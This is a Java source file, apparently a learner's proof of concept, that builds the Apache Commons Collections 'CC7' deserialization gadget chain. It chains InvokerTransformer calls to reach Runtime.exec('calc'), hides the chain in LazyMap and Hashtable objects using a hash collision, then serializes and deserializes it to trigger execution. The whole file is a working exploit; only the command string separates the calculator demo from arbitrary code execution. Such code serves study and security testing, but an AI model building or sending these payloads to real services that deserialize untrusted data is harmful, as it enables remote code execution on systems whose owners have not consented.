import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.io.*;  
import java.util.HashMap;  
import java.util.Hashtable;  
import java.util.Map;  
  
public class CC7Test {  
  
    public static void main(String[] args) throws Exception {  
  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),  
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),  
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
  
        Map map1 = new HashMap();  
        Map map2 = new HashMap();  
        Map lazyMap1 = LazyMap.decorate(map1,chainedTransformer);  
        Map lazyMap2 = LazyMap.decorate(map2,chainedTransformer);  
  
        lazyMap1.put("yy",1);  
        lazyMap2.put("zZ",1);  
  
        Hashtable hashtable = new Hashtable();  
        hashtable.put(lazyMap1,1);  
        hashtable.put(lazyMap2,2);  
  
        lazyMap2.remove("yy");  
  
        serialize(hashtable);  
        unserialize("F:\\Code\\Java Project\\CCTest\\src\\main\\java\\org\\example\\ser7.bin");  
  
    }  
  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("F:\\Code\\Java Project\\CCTest\\src\\main\\java\\org\\example\\ser7.bin"));  
        oos.writeObject(obj);  
    }  
  
    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));  
        Object obj = ois.readObject();  
        return obj;  
    }  
  
}
```